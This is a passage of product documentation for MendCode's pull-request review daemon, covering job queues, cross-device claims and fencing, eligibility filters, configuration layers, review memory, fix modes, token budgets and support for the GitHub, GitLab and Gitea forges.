catch-up: its first listing also asks for the work routed to its personal reviewers that no event announced (a review requested, a
claim that lapsed while it was down).

A second review request for a PR whose review is already queued or running (a repeated `/pr review`, `@mendcode review` on a head
the watch is reviewing) joins that job: the answer names it and no second review runs. `/reviews` shows a running job with its
phase (`analysis`, `corroboration`); `/reviews open <job id>` opens its reviewer session (the id is in the "Reviewing #N" notice).
The same comment is answered once, whatever the number of watches of the repository.

The run queue and the waiting records are counted apart (`/pr list` shows `jobs: N queued, M waiting`; `/reviews` groups jobs by
state):

- The **run queue** is the work this daemon runs itself: `pending`, `running`, `fixing`, `validating`, a backed-off retry, and a
  `waiting` job whose time came. Its size, 50, is a backlog mark, not a refusal: past it new work is still recorded as `pending`
  (durable, run in order, two at a time) and the session is told once an hour that the queue is behind. Nothing queued is cancelled
  for room.
- **Waiting records** are work this daemon does not run now: a PR routed to another device's reviewer, a claim held elsewhere, a
  quota reset. They are bounded at 500; past that the oldest is `cancelled` with the reason ("more than 500 jobs were waiting …;
  /reviews retries it"), never dropped silently.
- The ledger's hard bound is 1,000 open jobs. At it, the oldest waiting record makes room; when none can, the PR's event stays with
  the watch and the next poll queues it.

States: `pending`, `waiting` (held: an offline owner, a cooldown, a quota reset), `running`, `fixing`, `validating`,
`checkpointed` (stopped resumably with its work kept), `paused`, `done`, `failed`, `cancelled`, `stale` (the head or base moved).

Every posted review carries `<!-- mendcode:reviewer=ID config=VERSION effect=HASH -->`, the hash of what the post is: reviewer,
config version, head, base and the findings it carries. When a post times out or GitHub answers with a 5xx, the review may still
have gone through, so MendCode reads the PR's reviews for that marker before anything else and never sends it again in the same
attempt; when the reviews cannot be read, nothing is sent. The effects ledger (`<dir>/pr-review/effects.json`, newest 2,000) records
each write before it is sent: an effect already `done` is never sent again, one left `pending` by a crash is first looked up on the
PR, a refused one is `abandoned` with its reason. There is no exactly-once promise: two daemons without a shared ledger can both
post; claims and the check before each write ([one writer per pull request](#reviewers-routing-and-devices)) keep them apart, and
the markers stop the second post where they can.

### Which pull requests (eligibility)

Status: in the daemon. Each poll passes every PR event through `eligibility.ts`. A PR it does not take is not queued and is not
announced with a notice: `/pr list` shows the reason. A personal reviewer's profile can only narrow eligibility.

`mode` decides what starts a review by itself: `auto` (the triggers), `on-request` (only a requested reviewer, `@mendcode review`
or `/pr review`), `labels` (only with a label in `filters.labels.include`). Every decision has a reason a person can read
(`draft: waits for ready for review`, `labels: none of \`review-me\` is on the pull request`, `author @dependabot[bot] is a bot`);
a draft the watch skips shows that reason in `/pr list` like any other skipped PR, until it is marked ready.
Exclusions (`filters.*.exclude`) hold for every trigger, a manual request included. An `@mendcode review` or `@mendcode fix`
comment skips the mode and the `triggers.*` switches (someone asked), but not the filters: the draft rule (`triggers.drafts`), the
exclusions, the narrowing filters (base branches, authors, bots, changed paths) and, for a personal reviewer, its profile's
narrowing hold for a mention exactly as for an automatic review. An excluded PR gets one reply naming the filter (`MendCode does not
review this pull request: label \`skip-review\` excluded. …`), sent once through the effects ledger and the answer marker, and no
job or model turn starts. A comment never overrides a filter, and there is no key that lets it: a maintainer changes the filter on
the base branch (or removes the label). `/pr review` is the daemon owner's own request in their own session: exclusions hold for it
(it is refused with the filter's name), the draft rule and the narrowing filters do not. Being a fork never decides whether a PR is
reviewed, only whether a fix may be pushed to it. Who may ask stays with `reviewers`, `publishers` and write access, as above; an `@mendcode` comment from someone
without write access changes nothing (one refusal reply, no state change, nothing run). Before a write MendCode reads the asker's
permission fresh (`GET …/collaborators/{login}/permission`), so a permission revoked a minute ago is seen; a failed read is never a yes.

### Reviewers, routing and devices

Status: in the daemon. Each poll routes PRs through `.mendcode/reviewers.yaml` at the checkout's HEAD. A repository without that
file has the implicit global reviewer, plus `personal:<login>` for a `/pr watch-repo requested` watch.

`.mendcode/reviewers.yaml` on the base branch lists who reviews here: ids, `scope` (`global` or `personal`), a `login`, area globs,
capabilities (`review`, `fix`, `publish`) and an optional pinned `device`. It never holds memory, profiles or credentials (an
unknown key such as `memory:` makes the file a problem and the implicit global reviewer is used). Routing is deterministic and says
why: a requested reviewer or assignee whose login is a personal reviewer, a label route, an area glob a changed file matches, and
the repository's global reviewer (`routing.global: always`, or only when no personal reviewer matched with `personal-only`).

`capabilities` are enforced, and a reviewer without the list has all three:

- Without `review`, a reviewer is never assigned a review.
- Without `publish`, its reviews stay in its owner's session: nothing is posted, and its claim stays a local lease with no claim
  comment.
- Without `fix`, no automatic fix runs, and an `@mendcode fix` it would answer gets one reply saying so.

`review.yaml` still decides whether a capability is used (`fix.push`, `fix.personal`, `publishers`). A `login` follows the
checkout's forge, as in `review.yaml`. A global reviewer without a `login` runs on every `all` watch. A `requested` watch takes
the PRs that request or are assigned to its login, and the PRs that area or label routing gives its login's personal reviewer. An
`@mendcode` comment addressed to no one is taken on those PRs too: when the PR neither requests nor is assigned to the login, the
watch routes it through `.mendcode/reviewers.yaml` (its changed files, only when the personal reviewer has `areas` or a label
route) and takes the comment when routing names that reviewer. A routing read that fails leaves the comment for the next poll; a
comment addressed to someone else is never taken.

A personal reviewer whose machine is off is not a failure: its work waits. On another daemon such a PR is a `waiting` job with the
reason ("waiting for @alice's MendCode (offline or another device) …"); it is never run there and never failed. When the reviewer's
own daemon starts, it works out what it has to do from the provider's current state (open PRs, requested reviewers, assignees,
changed files) and skips heads already reviewed, so nothing depends on an event it missed. For area routing it reads the changed
files of at most the 20 newest unreviewed PRs. Every 10 minutes the waiting daemon reads
that PR again. Once the reviewer's login has submitted a review of the head, the waiting job closes as `done`, naming the device
that ran it.

**Offline fallback (opt-in).** By default nothing covers a personal reviewer that stays away. With `routing.offline_fallback` in
`reviewers.yaml`, a global reviewer takes the PR after a set time:

```yaml
routing:
  offline_fallback:
    after_minutes: 30    # 1 to 10080
    reviewer: team       # optional: a global reviewer with `review`; default `routing.fallback`, then the default global
```

The daemon that runs that global reviewer records a second `waiting` job next to the personal one, with the reason and the
recipient: `offline fallback: team reviews this pull request at <time> unless @alice's MendCode (alice-backend) claims or reviews
its head first`. The personal reviewer keeps priority. At that time, the cover job starts only when no personal reviewer it covers
holds a live claim on the PR ("offline fallback not needed now: … is back") or has reviewed the head ("not needed: reviewed by …");
it checks again right before posting. When it runs, its assignment and the session notice say why ("did not claim or review head
H within 30 min, so team reviews it"), and its claim marker carries `covers=alice-backend`. A personal job that starts later
waits on that claim, and once the cover's review of the head exists it closes `done` ("reviewed by … as the offline fallback;
not reviewed again here") without a model call or a post; the waiting record on the other daemon closes the same way. The
residual window of PR-comment claims (below) applies here too.

Without a coordinator there is one explicit owner per key. Each daemon has a device id (`<dir>/pr-review/device.json`, a random id
and the hostname as a label; not a secret). Leases (`<dir>/pr-review/ownership.json`) carry a fencing number that only grows: an
expired lease is taken over with a higher fence, a transfer gives the new owner fence + 1, and a write under an older fence is
refused. Across devices, a claim is a hidden marker comment on the PR that every device settles the same way (highest fence, then
earliest); it counts only for a listed reviewer, written by that reviewer's login (the global reviewer's: the login it posts as),
for at most a day.

**One writer per pull request.** Every review job claims its PR before it runs: a personal reviewer's, and the repository's global
reviewer's too, so a PC and a VPS that both watch a repository with `all` do not both work on one PR. The claim is posted as a
comment only when posting is allowed (`/pr publish on` and `publishers`); without that it stays a local lease that other devices
cannot see, and that daemon cannot post there either.

- While the job runs it renews the claim every half of its lifetime (two hours, so every hour): the local lease, and the marker
  comment edited in place, so a device keeps one claim comment per PR. When the job ends (done, stale, failed, parked) the lease is
  released and the comment edited to say so.
- Right before every write (the review post, a fix push) the job checks that it still holds the claim: its local lease still has its
  fence, and the claims on the PR still name this device. A device whose claim lapsed mid-run (a network cut kept it from renewing,
  the machine slept) and that another device took over with a higher fence sends nothing. A withheld review waits naming the holder
  (`device … took this pull request over (claim fence 2, this job's 1) while this job ran`) with what it found kept, and when it
  runs again it finds the other device's review of the head and ends `done` naming it; a withheld fix stays on its local ref
  (`refs/mendcode/fix/…`) with that reason. Claims that cannot be read at that moment are a reason
  to retry, never a yes. A pushed fix is also refused by git itself when the branch moved, since MendCode never force-pushes.
- Before a review post the job also reads the PR's reviews: this reviewer's review of the same head from another device (same login,
  same reviewer marker) means it does not post. A job that finds, at its start, a lapsed or released claim of another device and that
  device's review of the head ends `done` without a model call.
- A job waiting for another device's claim does not wait out the claim's two hours when the holder finishes early. A release (or a
  renewal, or a new claim) edits the PR's claim comment, and the watch's comment poll reads edits too: the next poll after it makes
  the PR's claim waits due, so they settle the claims again at once (done naming that device's review, or claimed and run here when
  nothing was posted). A claim still held sends the job back to wait; a quota wait or a retry backoff is not touched.

What this does and does not promise: PR-comment claims are best-effort coordination, not compare-and-swap. Posting a claim and
reading the others' are separate steps, so two devices that claim within the same few seconds, or while GitHub's comment list lags,
can both start. What keeps the writes single is the check right before each write (fence and per-head review marker) together with
the effects ledger (one daemon never sends the same effect twice, and reconciles an unconfirmed one against the PR first). A
residual window remains: two devices whose last checks fall in the same moment before either post is visible can both post. Two
daemons with different logins do not see each other's claims; the publisher check (a MendCode review of the head by another counted
publisher makes a reviewer stand down) covers them.

### Configuration layers

Status: in the daemon. A personal reviewer's run uses its profile as the personal layer. The configuration actions are answered
through `pr.review`, and the `review_config` tool is offered to sessions while `experimental.pr_review` is on. A native turn from a
peer never gets it.

The effective config is preset → repository (`.mendcode/review.yaml` on the base branch, the trust root) → personal profile
(`<dir>/pr-review/profiles/<provider>/<owner>/<repo>/<login>.json`, versioned, newest 50 versions, never in the repository) → task.
Each top-level key records the layer it came from. A personal or task layer may narrow and restyle (profile, cap, template, stages,
coverage, extra path instructions and ignores, a lower budget, a fix mode up to the repository's, stricter filters) but never turn on
what the repository has off or change what it controls (`enabled`, `fixes`, `fix.push`, `fix.personal`, `checks`, `publishers`,
`reviewers`, `preset`; `tokens_per_pr: null` over a capped repository is refused). A refused value is a problem naming its key path,
never a silent change.

The configuration actions (`config-show`, `config-preview`, `config-apply`, `config-revert`, `config-history`) need a `scope`:
without one nothing is read or changed and the answer names both targets. `global` writes the checkout's `.mendcode/review.yaml`
working-tree file only (never staged, committed or pushed; it counts once committed on the base branch), and its versions are the
file's commits. `personal` saves a new profile version; a revert is a new version equal to an old one. The `review_config` model
tool is the conversational side of these actions ("my review" is personal, "the repo's" is global; each write asks you with the
exact before and after). Every action but `setup` needs a `scope`.

`review_config` `setup` is read-only, and it is where a guided setup with the developer starts ([team setup](pr-review-setup.md)).
It reports:

- the forge, the user's login and permission;
- `.mendcode/review.yaml` and `.mendcode/reviewers.yaml` on the base branch, and the working-tree diff;
- whether the hosted workflow is installed;
- this daemon's watches and their posting consent;
- other devices' claims on open PRs;
- the personal profile's path;
- the signals of the user's role: permission, `CODEOWNERS`, `MAINTAINERS`, a `reviewers.yaml` entry, recent PR activity, and
  saved memories that state a role.

It ends with what is missing and the questions to ask, so the model confirms instead of assuming. On GitLab and Gitea the login,
permission and activity are not read there, and the developer is asked instead.

### Memory in reviews

Status: in the daemon. The daemon binds `review-memory.ts` to its memory store, and each review job gets the block its reviewer's
scope allows, at most 4,000 tokens.

Review children are headless and get no memory block of their own (`noMemory`) and no instruction files. The memory a review may
use is chosen explicitly from MendCode's native memory and travels in the review prompt as one reference block, with each line's
scope, id and dates; it is the same text for the native engine, Claude Code and Codex review children. A Claude Code child also
runs with its own CLAUDE.md files and auto memory off (see above). A Codex child runs with Codex memories off and without the
worktree's `AGENTS.md` (see above); only your own `~/.codex/AGENTS.md` still reaches it (no Codex switch removes it; see above).

- The **global** reviewer reads only project memories of the checkout that the user shared (`/memory`, Sharing, `ENABLE PROJECT`),
  and of those only what memory sharing would export (no secret, not `security`, not high sensitivity) and that describes the code
  (`preferences` and `volatile` are left out). Never user-scope or session memory.
- A **personal** reviewer reads that profile's user memories and the checkout's project memories, only with `memoryUse` on.

Every left-out memory is listed with its reason. What a review learns comes back only as a Pending proposal (tagged `pr-review`),
never saved by itself; one that came from memory or from `.mendcode/review-learnings.md`, or restates the context it was given, is
refused as an import loop.

### Fix modes and taking over

Status: in the daemon. After a review with open confirmed findings, `fix.mode` fix-once or fix-loop runs on the job. It pushes only
with `fix.push` (plus `fix.personal` for a personal reviewer) and `/pr publish on`, and only to a branch that takes the push: a fork
must allow edits from maintainers. Otherwise each fix is kept on a local ref. `@mendcode fix` runs through the same `runFix`. Take-over
and release are actions of the `/reviews` page. Fix sessions run with `--setting-sources user` on Claude Code, so the PR's own
harness settings never load.

`fix.mode`: `review` (no fix), `fix-once` (one fix round of the confirmed findings, whatever `fix.max_rounds` says) or `fix-loop`
(fix, validate, review again until no confirmed finding is open, at most `fix.max_rounds` rounds). A fix runs in a throwaway worktree, never your checkout, and is committed and kept on
`refs/mendcode/fix/<number>/<time>` before anything else is decided. It is pushed only when `fix.push` is on (and `fix.personal` for
a personal reviewer), the job is not taken over, the PR is still open, the reviewer may still push (a fresh permission read; a fork
must allow edits from maintainers), and the branch tip (and the base, when it matters) is still where the fix started. Otherwise the
commit stays on its local ref with the reason; a branch that moved makes the result `stale` and nothing is overwritten. Never a
force push, never a merge. A failed validation never ends `done`; rounds that do not shrink the open findings stop after
`phases.max_rounds_without_progress` (`no_progress`, in rounds), and `fix.max_rounds` caps the loop.

**A pushed fix is reviewed by its job.** After a push the job reviews the head it pushed, incrementally (only the fix's commits,
from the last reviewed head), and that review resolves the threads of the findings the fix removed. GitHub reports a pushed head a
few seconds late, so the job first waits for GitHub to report it (reads at once and after 1, 2, 4, 8 and 15 s). A round counts as
resolving findings only when that review ran: when GitHub still reports the old head after about 30 s, the job ends `failed` with
`the fix … was pushed but not reviewed: GitHub still reported … as the head after 30 s …` and the findings it set out to fix listed
as not checked again (never `done`), and the watch takes the pushed head back as unseen, so the listing that reports it queues its
review like any push. When the head moved past the fix (someone pushed on top), the job ends `stale` and that head's own review
covers the fix's commits.

**A round resolves only what its re-check closed.** That review re-checks the findings the round set out to fix with the published
ones, in every file the fix changed, so a fix that inserts the missing line next to the flagged one (the flagged line itself only
moves) is checked like one that rewrites it. The round counts as resolving exactly the findings the re-check found fixed; the others
stay open beside whatever the review found new: `fix-loop` fixes them in its next round, and `fix-once` (or a loop at
`fix.max_rounds`) ends `failed` with the stop naming them, such as `1 confirmed finding still open (cancel.ts:8)`, never `done`. A
re-check that fails resolves nothing. Before, a round counted every finding it set out to fix as resolved when the review of the
fix found nothing new, so an inserted fix ended `done` with its thread open (seen live).

**Commit messages.** A fix commit's subject is at most 72 characters, cut at a word. A `fix.mode` commit is named after the finding
it fixes (or `fix: address N confirmed findings of MendCode's review`) and its body says it is the automatic fix mode
(`fix.mode: fix-once`) and lists the findings; an `@mendcode fix` commit is named after the request and its body names the commenter
and links the comment. The fix session's prompt says the same: an automatic fix is not presented as someone's `@mendcode fix`. Both
kinds of fix session are told the repository's review language (`template.language`), since what they write is public too.

Taking a job over gives you its fix session: the job is paused with `control: user`, no automatic fix or push runs, a second
take-over is refused with who holds it, and only the holder releases it (back to `pending`, resuming from its checkpoint). A round
the take-over interrupted before its push is recorded as `interrupted` with its kept commit and does not count against
`fix.max_rounds` or the no-progress guard. After the release the job does not announce its review again; it says it continues
(`fix mode fix-once continues after the take-over was released: the kept fix … is pushed to the branch; the interrupted round is not
counted`), pushes that kept commit with the same checks as any push (or keeps it, when pushing is not allowed), and reviews the
pushed head. When the kept fix no longer applies (its ref is gone, or the branch moved off the head it was made on) the round is
redone with a new fix session.

### Stages

Status: in the daemon. Each run plans its stages from its effective config and the change, and the decisions are kept on the job's
checkpoint.

`phases.mode`: `none` (no visible stages; the job still moves through its operational states), `fixed` (`phases.list` as given) or
`dynamic` (default: discovery, analysis, corroboration, fix when enabled, validation, plus stages chosen from evidence:
`migrations`, `security`, `contracts`, `stack`). Each added or skipped stage is recorded on the job with its reason ("`db/migrations/0042_users.sql` is a migration or schema path").
A stage is instructions, never new tools or permissions; a list cannot remove the verify pass or the closing gate, and an invalid
list falls back to the preset stages and says why. Validation is a deterministic gate: incomplete, unverified, a failing check or
an open confirmed finding is never `done`.

### Stacked pull requests

Status: in the daemon. Each poll builds the stack graph. A parent's new head revalidates its children (trigger `stack`). A child's
run starts at its parent's head, and findings the parent already reported are left out.

A PR whose base branch is another open PR's head branch is stacked on it; the graph comes from the provider's open PRs, never from
commit ancestry. A child is reviewed on its own commits (from its parent's head), so the parent's changes are not reviewed twice. A
parent update, rebase, retarget, merge or close marks the child and its descendants for revalidation; a finding the child shares
with its parent (same path, code line, category and summary, wherever the line moved) is the parent's, and its fix belongs on the
parent's branch. Findings keep their identity across new SHAs (moved, `needs-recheck` when their line changed, `deleted`). A cycle
or an ambiguous parent is reported and the PR is reviewed against its base. MendCode never restacks: it says what to run
(`gt restack` or `git rebase --onto …`) and which files would conflict.

### Budgets, quotas and accounting

Status: in the daemon. A budget stop leaves the job `checkpointed` with its candidates, and the session is told why. `job-retry`
(with a reason, from the `/reviews` page) resumes from that checkpoint: only the verify pass runs, then the review is published
once. It runs under the policy on the base branch at that moment, so a budget the repository raised meanwhile applies. A quota or
rate limit with `on_quota: wait` puts the job in `waiting` until the reset and then resumes the same way. Every model turn is
recorded in `accounting.json`, under purpose `resume` for a resumed verify pass.

The cap a review actually gets scales with its diff: `min(tokens_per_pr, 150,000 + tokens_per_diff_token x diff tokens)`, so a
one-commit review cannot spend a whole-PR allowance. It is enforced inside a model turn too: a turn whose reported tokens reach
what is left of the review pass's share (80%) or of the verify budget is cancelled, and the review ends as incomplete ("stopped at
the token budget; nothing was published") with its checkpoint, instead of finishing the turn first. A personal config can only
lower `tokens_per_diff_token`.

Before each call of the review pass (each part of a large diff) the reviewer checks that the rest of the diff fits what the pass has
left. Before the first call the floor is the diff's own size; after some parts, the rest is projected at what those parts really
counted per diff token (a diff of numbers, such as JSON results, counts far more than its size suggests). A diff that cannot fit
is never sent ("Nothing was sent to a model"), and a rest that cannot fit stops before the next part instead of paying for it.
Both are budget stops with their checkpoint: raise `tokens_per_pr` and retry, and the review continues from the parts it has.

When the first pass says it could not review the change (a restriction on its tools or mode, files it could not read: the
`incomplete` key of its answer, or a summary that says "the review is incomplete" with no findings), the review ends there as
incomplete, with no verification, nothing published and a notice that says so. A defect the first pass named that verification
ruled out is listed in the summary as ruled out, never as a finding.

Five limits are kept apart: `budget.tokens_per_pr` (MendCode's own cap per PR head, across review, verify, fix and resumed rounds;
`null` is no internal cap), `budget.context_tokens` (one call, not a total), the provider's real quota, a rate limit, and the loop
limits of the fix loop. Counted tokens are input not served from the provider's cache plus output; cached tokens are shown apart,
never converted. At the cap a review stops resumably with its candidates kept (never dropped, never published as a complete
review), and a resume verifies only those candidates, with no second review pass. A real quota waits for the reset the provider
names (`on_quota: wait`, within `max_wait_minutes`) or stops (`on_quota: stop`); a rate limit backs off a few times. There is no
third option: no other model, provider, API key or paid usage. Accounting (`<dir>/pr-review/accounting.json`) keeps every call's
reported input, output and cache figures per PR head, purpose and attempt, across restarts; a call with no report is counted as
unknown, never as zero.

A call that does not end normally is still accounted, with only what the source reported. A turn that fails, is cancelled or is
stopped as stalled keeps the usage its engine reported before it ended (a Claude Code turn cut short reports its partial usage)
and counts as one call without a full report (`unreported`). A call the daemon was running when it was killed is kept in the file
while it runs (`open`); the next start accounts each one left as `unreported` on its PR head and job, plus what its child session
recorded beyond the calls already counted for it. Claude Code reports usage at the end of a turn, so a turn killed with the daemon
usually stays unknown: it is shown as a call without a report, never as an estimate.

### Concurrency

`prReview.concurrency` (`settings.set`, 1 to 4, default 2) is how many reviews or `@mendcode` commands this device runs at once,
across every watched repository. It is a per-device setting, not a `review.yaml` key: the watch's queue is daemon-wide, so the
value is this machine's capacity, while repository config applies per review (one repository could not set the limit for
another). It is a machine setting, so a config bundle never carries it to another device, and a remote or peer client cannot set
it. A change applies to the next start, without a restart. The background job scheduler shared with Dream, loops and workflows
also caps how many run (2 in normal mode, 4 in high), so values above 2 take effect only there. `/pr watch-repo list`, the
`pr_review` status and the `/reviews` page show the value ("running N of M at once").

### Performance of MendCode's own pull requests

When the repository under review is MendCode itself (the checkout's root package is `mendcode` and holds `scripts/perf-attrib.ts`),
the daemon measures the pull request before the model pass: it runs `bun scripts/perf-attrib.ts --base <merge base> --cand <head>
--markdown` as a separate subprocess (the review model stays read-only and builds nothing), on the offline faux engine, so it uses no
model and no login. The table goes into the review's details and to the model as input, so a finding can cite its numbers; the only
model cost is the table's text.

- A metric that rose above the measured noise (the script exits 1) adds a critical `performance` finding on the first changed line
  of the code that can change cost. Within the noise is no difference.
- Without a table, the model is told so and reports a major finding when the change adds start-up, per-turn or per-frame work, a
  timer, a stored row or column, a dependency or an embedded asset and the pull request gives no before/after numbers.
- It runs only when the diff touches code, manifests or build scripts (`apps/`, `packages/`, `features/`, `package.json`, the lockfile,
  `scripts/build*`); a diff of docs, tests and fixtures alone is skipped. A head in a fork is never built; the review says so.
- It never blocks or fails a review. A timeout (20 minutes), a failed build or a missing `bun` leaves a note in the review:
  "Performance was not measured: <why>".
- Built binaries are cached per full commit id, platform and arch in `<data dir>/pr-review/perf/cache`: the newest two (a base and a head) are kept,
  anything older than three days or left half-written is removed after every run, and scratch directories are deleted at the end.
- `prReview.perfAttrib: false` (`settings.set`, on when unset) turns the phase off. Other repositories are never measured.

### Providers

The daemon picks the forge from the checkout's `origin`: github.com through `gh`, as described above; gitlab.com, or a host whose name
contains `gitlab`, through GitLab's adapter (`glab api`, with glab's own login: `glab auth login`, or `GITLAB_TOKEN` read by glab);
codeberg.org, or a host whose name contains `gitea` or `forgejo`, through the Gitea / Forgejo adapter (REST `/api/v1`, the token read from `GITEA_TOKEN` at
each call, never stored). A self-hosted instance on any other host is named in the checkout: `git config mendcode.forge gitlab`
(or `gitea`), and, for an ssh remote or another web port or scheme, `git config mendcode.forgeUrl http://host:port`. MendCode never
reads, prints or stores a forge token itself.

On GitLab and Gitea the daemon runs the watch (the adapter lists the open PRs or MRs each poll; comments are read only on a PR
updated since the last read), reviews and their posts (one summary note or review plus inline comments, with the same head and
reviewer markers, so a head is never posted twice), the `@mendcode` commands with the same write-access rule (the adapter's
permission read), claims (one edited comment), and `@mendcode fix` pushes to the PR's branch, or a fork's when the PR allows
maintainer edits. What a forge lacks is said once in the `/pr watch-repo` answer, never skipped silently:

| Daemon feature | GitHub | GitLab | Gitea / Forgejo |
|---|---|---|---|
| Watch, review post, dedupe of a head, `@mendcode` commands, claims, fix push | yes | yes | yes |
| Resolve a fixed finding's thread | yes | yes | no: Forgejo has no API for it, and the adapter does not tell Gitea from Forgejo |
| Explain a failing check after a review | yes | no: no pipeline reader is wired | no: no Gitea Actions reader is wired |
| Hosted runner (`mendcode github run`) | yes | no: it is a GitHub Action | no: it is a GitHub Action |

Not read on GitLab or Gitea: linked issues. A personal reviewer's profile is kept under the `github` provider directory on every forge.

What each adapter really does (the platform never imitates a missing capability):

| Capability | GitHub | GitLab | Gitea / Forgejo |
|---|---|---|---|
| Inline comments on diff lines | yes | yes | yes |
| Suggested-change blocks | yes | yes | no |
| Resolve a thread when fixed | yes | yes | no |
| One review object with an event (COMMENT) | yes | no | yes |
| Requested reviewers | yes | yes | yes |
| Labels | yes | yes | yes |
| Draft state | yes | yes | yes |
| Push to a fork's branch when allowed | yes | yes | yes |
| Conditional list requests (ETag) | yes | no | no |
| Verified | contract (fixtures, not live) | live | live |

The GitHub row is the new adapter's; the daemon's own GitHub path is the one this page describes above and has been used live.
GitLab and Gitea are `live` because `MENDCODE_LIVE_FORGES=write bun scripts/live-forges.ts --forge gitlab|gitea --daemon` passed
against local GitLab CE 19.5.3 and Gitea 28.2.0 on 127.0.0.1 (2026-10-30): the daemon itself, with scripted review children and no
model, watched the repository, posted one review with an inline comment and a released claim for a new PR, posted nothing more for
the same head after two polls and a manual `/pr review`, refused a reader's `@mendcode pause` in the PR, and pushed and answered a
writer's `@mendcode fix`. Not run live at daemon level: a reply inside a diff thread, thread resolution, a push to a fork, and
Forgejo itself; those rest on the adapters' live checks (`scripts/live-forges.ts` without `--daemon`) and contract tests.
